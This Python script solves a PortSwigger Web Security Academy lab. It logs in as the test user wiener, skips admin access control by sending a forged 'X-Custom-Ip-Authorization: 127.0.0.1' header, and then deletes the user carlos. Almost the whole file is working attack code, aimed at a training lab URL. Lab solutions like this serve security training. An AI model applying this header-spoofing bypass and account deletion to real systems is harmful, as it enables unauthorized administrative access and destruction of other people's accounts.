###############################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 3/9/2023
#
# Lab: Authentication bypass via information disclosure
#
# Steps: 1. Fetch /login page
#        2. Extract the session and the csrf token
#        3. Login as wiener
#        4. Extract the new session
#        5. Bypass admin access using custom header
#        6. Delete carlos
#
###############################################################################

###########
# imports
###########
import requests
import re
from colorama import Fore

# change this url to your lab
url = "https://0ac700ab03419a3b8693dfeb00970083.web-security-academy.net"

try:  # try to fetch /login page
    get_login = requests.get(f"{url}/login")
    if get_login.status_code == 200:
        print(Fore.WHITE + "1. Fetching /login page.. " + Fore.GREEN + "OK")
        session = get_login.cookies.get("session")  # extract the session
        csrf = re.findall("csrf.+value=\"(.+)\"",
                          get_login.text)[0]  # extract the csrf token
        print(Fore.WHITE + "2. Getting session and csrf token.. " +
              Fore.GREEN + "OK")
        try:
            data = {
                "username": "wiener",
                "password": "peter",
                "csrf": csrf
            }
            cookies = {
                "session": session
            }
            post_login = requests.post(
                f"{url}/login", data, cookies=cookies, allow_redirects=False)  # try to login as wiener
            if post_login.status_code == 302:
                print(Fore.WHITE + "3. Logging in as wiener.. " + Fore.GREEN + "OK")
                new_session = post_login.cookies.get(
                    "session")  # extract the new session
                print(
                    Fore.WHITE + "4. Getting a new session as wiener.. " + Fore.GREEN + "OK")
                try:
                    cookies = {
                        "session": new_session
                    }
                    headers = {
                        # bypass the admin access using this header
                        "X-Custom-Ip-Authorization": "127.0.0.1"
                    }
                    delete_carlos = requests.get(
                        f"{url}/admin/delete?username=carlos", headers=headers, cookies=cookies)  # try to delete carlos
                    print(
                        Fore.WHITE + "5. Bypassing admin access using custom header.. " + Fore.GREEN + "OK")

                    if delete_carlos.status_code == 200:
                        print(Fore.WHITE + "6. Deleting carlos.. " +
                              Fore.GREEN + "OK")
                        print(
                            Fore.WHITE + "[#] Check your browser, it should be marked now as " + Fore.GREEN + "solved")

                except:
                    print(
                        Fore.RED + "[!] Failed to delete carlos through exception")
        except:
            print(Fore.RED + "[!] Failed to login through exception")
except:
    print(Fore.RED + "[!] Failed to GET /login page through exception")
